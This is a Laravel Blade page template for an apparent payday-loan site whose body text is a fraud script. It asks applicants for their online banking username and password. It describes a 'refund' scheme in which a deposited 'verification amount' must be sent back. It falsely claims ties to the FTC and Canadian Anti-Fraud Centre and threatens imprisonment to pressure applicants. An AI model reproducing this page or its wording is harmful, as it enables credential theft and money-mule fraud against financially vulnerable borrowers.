@extends('layouts.app')

@section('css')
<script type="text/javascript" src="asset/js/jquery.signature.min.js"></script>
<link rel="stylesheet" type="text/css" href="asset/css/jquery.signature.css">

<style>
    .kbw-signature { width: 400px; height: 200px;}
    #sig canvas{
        width: 100% !important;
        height: auto;
    }
</style>
@endsection

@section('content')
<div class="container-fluid py-5">
    <div class="container">
        <div class="col-md-12 pt-5">
            <p>
                We're on it.
            </p>
            <p>
                We follow specific rules and criteria to keep the company's money safe from those trying to steal the money in the form of Loans.
            </p>
            <p>
                As your verification procedure is incomplete and insecure. Firstly we have to complete your verification process and keep your application secure by linking your account with the company's portal. The loan portal helps you to manage and access your loan application and due payments. In 2018-2021, Many loan companies were the target of Web Scraping, Loan Phishing, Bankruptcy, Wire Intercept & Mule Herding. Due to this many fraudulent activities in the United States & Canada. Considering all these activities affecting the company's finances and economy.  We have changed the eligibility criteria and we are taking steps to prevent loss in the future. Before sanctioning any amount to you, our representative might do any verification process to protect your identity and to prevent fraud. The verification can be done in two ways. (1) Three-way conference call with the bank and (2) Verifying the account holder's name (3) Refund Process(Verification process). A Three-way conference call is only possible after signing the loan documents and receiving the rights to debit the installment's . As we are affiliated with The Federal Trade Commission(FTC) & Fraud Reporting System (Canadian Anti-Fraud Centre), we are not authorized to call your bank without signing any loan documents. There will be no processing fees or upfront fees. We are not authorized to Log In to your account or to take any funds out of your account without your permission. Any employee accessing your account and wiring money out of your account will be terminated and the RCMP & FTC department will cancel our license for PAYDAY LOANS. Coming to the second option verifying the account holder's name. In this, we need to link your account with the company's portal to ensure that you’re the same person who applied for a loan. To link your account with the company's portal we need to have your USERNAME & PASSWORD for online banking.  All this is because the companies being a target this days, so the company is concerned about the money and taking steps to prevent fraud. Once you are verified, the loan will be sanctioned to your checking account. Coming to third option Refund Process, the refund process is basically a verification process in which the loan company will deposit any verification amount to your account to verify that you are only the person who has an access to your account. So after receiveing the verification amount into your checking account, you will have to refund the verification amount back to the company. Once you refund the verification amount back to the company, we will verify the money and sanctioned the desired loan amount into your checking account. To refund the verification amount you will be given several option by your loan officer.
            </p>
            <p>
                Make sure that the refund process is taken care by the FTC & RCMP department, so incase if someone trying to run away with the verification amount will have to face some legal consequences and lead to imprisonment.The maximum punishment for frauds as specified in Section 447 is imprisonment for a term which shall not be less than six months but which may extend to ten years and will have to pay a fine for $6800 in the court.
            </p>
            <p>
                We consider you have read all the informations carefully because you will be the only responsible person if you take any part in the above crime.
            </p>
            <p>
                <input type="checkbox" name="" id=""> I assure that the all the information provided above is true, any false information will lead to imprisonment
            </p>
        </div>
        <div class="col-md-12">
            <form action="/thankyou">
                <button type="submit" class="btn btn-info">Submit</button>
            </form>
        </div>

    </div>
</div>
@endsection

